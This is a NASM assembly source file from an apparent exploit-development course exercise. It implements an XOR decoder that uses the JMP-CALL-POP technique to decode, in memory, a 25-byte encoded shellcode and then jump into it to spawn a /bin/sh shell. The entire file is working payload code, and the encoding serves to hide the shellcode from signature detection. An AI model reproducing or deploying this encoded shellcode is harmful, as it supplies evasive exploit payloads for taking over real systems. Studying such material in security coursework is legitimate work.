; Filename: shell_xor-decoder.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method, xor decodes the shellcode in memory
; The resulting shellcode is 45 bytes

global _start

section .text

_start:
        jmp step1 ; unconditional jump to step1

step2:
        pop edx ; retrieves the address of Shellcode
        xor ecx, ecx ; assigns 0x00 to ECX
        mov cl, 0x19 ; assigns 25 to ECX

decode:
        xor byte [edx], 0xaa ; decode the shellcode byte by byte by xor'ing it with 0xaa
        inc edx ; move to the next byte in line to xor
        loop decode ; continue with the loop (jumps back to decode)

        jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution

step1:
        call step2 ; jumps to step2 while pushing the address of Shellcode to the stack
        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x9b,0x78,0x1a,0xa1,0x67,0x2a